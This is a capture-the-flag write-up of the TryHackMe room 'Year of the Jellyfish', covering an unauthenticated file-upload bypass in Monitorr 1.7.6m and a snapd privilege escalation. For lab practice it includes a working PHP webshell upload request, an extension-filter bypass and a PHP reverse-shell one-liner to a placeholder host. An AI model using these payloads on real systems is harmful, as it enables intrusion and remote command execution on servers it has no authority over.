@@ -1,0 +1,92 @@
+I"L!<p><br /></p>
+
+<blockquote>
+  <p>A log of how I did the TryHackMe room Year of the Jellyfish by Muirland Oracle</p>
+</blockquote>
+
+<p><br /></p>
+
+<h1 id="year-of-the-jellyfish">Year of the Jellyfish</h1>
+<h2 id="monitorr-176m-unauthed-file-upload">Monitorr 1.7.6m Unauthed File Upload</h2>
+<p>The initial nmap scan returned the following open TCP ports: 21, 22, 80, 443, 8000, 8096. As it would turn out, ports 8000 and 8096 are red herrings and don’t lead to any foothold on the box. This is something I was sad to discover, as I was looking forward to exploiting the Jellyfin Media Server.</p>
+
+<p>Looking into the SSL certificate for <code class="language-plaintext highlighter-rouge">robyns-petshop.thm</code>, I see that it also supports the subdomains <code class="language-plaintext highlighter-rouge">monitorr</code>, <code class="language-plaintext highlighter-rouge">dev</code>, and <code class="language-plaintext highlighter-rouge">beta</code>.</p>
+
+<p>Navigating to <code class="language-plaintext highlighter-rouge">https://monitorr.robyns-petshop.thm</code> I find Monitorr v1.7.6m is running. This version has an unauthenticated file upload vulnerability, which can naturally be converted into RCE.</p>
+
+<p>I also notice that my requests are sending the cookie <code class="language-plaintext highlighter-rouge">isHuman=1</code>. I change the value to <code class="language-plaintext highlighter-rouge">0</code> to see what happens and it doesn’t like it, accusing me of being a hacker. That’s prepostorous of course so I note to send <code class="language-plaintext highlighter-rouge">Cookie: isHuman=1</code> with all future requests.</p>
+
+<p>As I’m practicing for the OSWE exam, I choose to build my own exploit code based on the knowledge that the vulnerability relates to the file <code class="language-plaintext highlighter-rouge">/assets/php/upload.php</code>.</p>
+
+<p>Lets break down this portion of the <code class="language-plaintext highlighter-rouge">upload.php</code> file.</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nv">$target_dir</span> <span class="o">=</span> <span class="s2">"../data/usrimg/"</span><span class="p">;</span>
+ <span class="nv">$target_file</span> <span class="o">=</span> <span class="nv">$target_dir</span> <span class="mf">.</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"fileToUpload"</span><span class="p">][</span><span class="s2">"name"</span><span class="p">]);</span>
+ <span class="nv">$uploadOk</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+ <span class="nv">$imageFileType</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nb">pathinfo</span><span class="p">(</span><span class="nv">$target_file</span><span class="p">,</span><span class="no">PATHINFO_EXTENSION</span><span class="p">));</span>
+ <span class="nv">$check</span> <span class="o">=</span> <span class="nb">getimagesize</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"fileToUpload"</span><span class="p">][</span><span class="s2">"tmp_name"</span><span class="p">]);</span>
+ <span class="nv">$rawfile</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"fileToUpload"</span><span class="p">][</span><span class="s2">"name"</span><span class="p">];</span>
+</code></pre></div></div>
+
+<p>On line 2, the $_FILES is a superglobal PHP variable that refers to files uploaded through a POST request.</p>
+
+<p>The first subscript <code class="language-plaintext highlighter-rouge">["fileToUpload"]</code> refers to the name of the file upload section in the multipart/form-data formatted POST request body.</p>
+
+<p>The second subscript <code class="language-plaintext highlighter-rouge">["name"]</code> refers to the actual filename, as it was uploaded. In this case, <code class="language-plaintext highlighter-rouge">name</code> is a placeholder for the actual filename, not the name of the file.</p>
+
+<p>Anyway, all this is piece of code is saying, is that it will save the file I send in a POST request to the <code class="language-plaintext highlighter-rouge">upload.php</code> endpoint.</p>
+
+<p>For a preliminary proof of concept, I make a simple HTML upload form:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"https://monitorr.robyns-petshop.thm/assets/php/upload.php"</span> <span class="na">method=</span><span class="s">"post"</span> <span class="na">enctype=</span><span class="s">"multipart/form-data"</span><span class="nt">&gt;</span>
+ 	<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"file"</span> <span class="na">name=</span><span class="s">"fileToUpload"</span> <span class="nt">/&gt;</span>
+ 	<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="nt">/&gt;</span>
+ <span class="nt">&lt;/form&gt;</span>
+</code></pre></div></div>
+
+<p>By capturing the request in burp and sending it to repeater, I’m able to easily fuzz and experiment with different payloads.</p>
+
+<p>Through a bit of experimentation, I determine the following limitations:</p>
+
+<ul>
+  <li>filename extension cannot begin with <code class="language-plaintext highlighter-rouge">.php</code></li>
+  <li>filename must have an image filetype extension</li>
+  <li>file must begin with magic bytes corresponding to an image file</li>
+</ul>
+
+<p>I’m able to bypass the filters and upload a <code class="language-plaintext highlighter-rouge">.phtml</code> file which will render and execute PHP code using the following POST request:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /assets/php/upload.php HTTP/1.1
+Host: monitorr.robyns-petshop.thm
+Content-Type: multipart/form-data; boundary=--------------------------190412675211009862293213789695
+Content-Length: 350
+Cookie: isHuman=1
+
+-----------------------------190412675211009862293213789695
+Content-Disposition: form-data; name="fileToUpload"; filename="webshell.png.phtml"
+Content-Type: image/png
+
+PNG
+&lt;?php passthru($_GET["c"]);
+-----------------------------190412675211009862293213789695--
+</code></pre></div></div>
+
+<p>Note:</p>
+
+<ul>
+  <li>The filename <code class="language-plaintext highlighter-rouge">webshell.png.phtml</code> satisfies the image filetype extension requirement while bypassing the <code class="language-plaintext highlighter-rouge">/\.php.*/</code> pattern matching filter for the extension.</li>
+  <li>Some experimentation was needed to determine that the webshell payload <code class="language-plaintext highlighter-rouge">&lt;?php passthru($_GET["c"]);</code> should not have a closing bracket <code class="language-plaintext highlighter-rouge">&gt;</code> to properly function.</li>
+</ul>
+
+<p><img src="/assets/media/yearofthejellyfish/webshell.png" alt="Output of 'id' on the webshell page. You can see some of the binary data from the image file being rendered as unicode characters." /></p>
+
+<p>I URL encoded this PHP oneliner reverse shell <code class="language-plaintext highlighter-rouge">php -r '$sock=fsockopen("&lt;IP&gt;",&lt;PORT&gt;);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</code> and caught a shell as <code class="language-plaintext highlighter-rouge">www-data</code>.</p>
+
+<h2 id="cve-2019-7304">CVE-2019-7304</h2>
+<p>After some enumeration the command <code class="language-plaintext highlighter-rouge">apt list --upgradeable</code> shows me an outdated version of Snapd: <code class="language-plaintext highlighter-rouge">snapd/bionic-updates 2.49.2+18.04 amd64 [upgradable from: 2.32.5+18.04]</code>. This version is susceptible to a neat vulnerability, CVE-2019-7304, that involves creating a UbuntuOne account online.</p>
+
+<p>After creating an account, you provide it with a public SSH key and then use the private counterpart to start a malicious socket connection to the package manager.</p>
+
+<p>From there you’re able to create a new user with root privileges.</p>
+
+<p>The comments on <a href="https://github.com/initstring/dirty_sock/blob/master/dirty_sockv1.py">this</a> PoC are well written and teach a good bit about how the exploit functions.</p>
+:ET
